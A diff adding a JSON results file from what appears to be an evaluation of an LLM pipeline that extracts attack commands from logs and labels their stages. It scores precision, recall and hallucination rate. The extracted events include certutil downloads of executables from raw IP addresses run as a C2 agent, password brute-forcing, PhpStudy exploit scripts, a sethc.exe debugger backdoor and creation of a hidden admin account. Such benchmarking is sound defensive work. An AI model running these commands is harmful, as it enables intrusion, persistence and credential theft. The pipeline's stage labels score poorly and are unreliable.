@@ -1,0 +1,107 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "cmd.exe /c \"taskkill /f /im agent.exe&certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe&cmd /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443\"",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Execution"
+      },
+      {
+        "command": "agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "stage": "Persistence"
+      },
+      {
+        "command": "cmd.exe /c winbrute.exe administrator_pass.txt administrator",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "cmd.exe /c 'python PhpStudyPoc.py http://121.36.30.176/'",
+        "stage": "Collection"
+      },
+      {
+        "command": "reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe /v Debugger /t REG_SZ /d C:\\windows\\system32\\cmd.exe /f",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "cmd.exe /c 'python PhpStudyExp2.py http://121.36.30.176/ whoami&arp -a&ipconfig&ping www.baidu.com -c 1'",
+        "stage": "Collection"
+      },
+      {
+        "command": "cmd.exe /c 'taskkill /f /im agent.exe&certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe&cmd /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443'",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "wmic cpu get NumberOfLogicalProcessors",
+        "stage": "Discovery"
+      },
+      {
+        "command": "systeminfo | find \"\ufffd\ufffd\ufffd\ufffd\ufffd\u06b4\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://111.229.170.12/phpmyadmin/themes/servert.exe C:\\Windows\\ywm.exe",
+        "stage": "Execution"
+      },
+      {
+        "command": "C:\\Windows\\ywm.exe",
+        "stage": "Persistence"
+      },
+      {
+        "command": "net1.exe user oop o33 /add",
+        "stage": "Persistence"
+      },
+      {
+        "command": "net1.exe localgroup administrators oop /add",
+        "stage": "Privilege Escalation"
+      }
+    ],
+    "narrative": "The attack began with downloading and executing a remote agent via command injection, initially accessing the system through crafted commands. The malware then stole credentials using brute force methods and communicated through various proxies to establish persistence. It also performed reconnaissance tasks such as discovering system details and IP addresses, and collected system information. Additionally, it employed defensive evasion tactics like modifying the sethc executable to run an interactive shell, and utilized lateral movement techniques.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 26066,
+      "completion_tokens": 3549,
+      "total_tokens": 29615,
+      "wall_clock_s": 40.213,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.35714285714285715,
+      "recall": 0.625,
+      "f1": 0.45454545454545453,
+      "tp": 5,
+      "fp": 9,
+      "fn": 3
+    },
+    "stage": {
+      "precision": 0.14285714285714285,
+      "recall": 0.2857142857142857,
+      "f1": 0.19047619047619047,
+      "tp": 2,
+      "fp": 12,
+      "fn": 5,
+      "recall_partial": 0.3333333333333333
+    },
+    "hallucination_rate": 0.058823529411764705,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 26066,
+      "completion_tokens": 3549,
+      "total_tokens": 29615,
+      "wall_clock_s": 40.213,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v4_triage",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true
+  }
+}
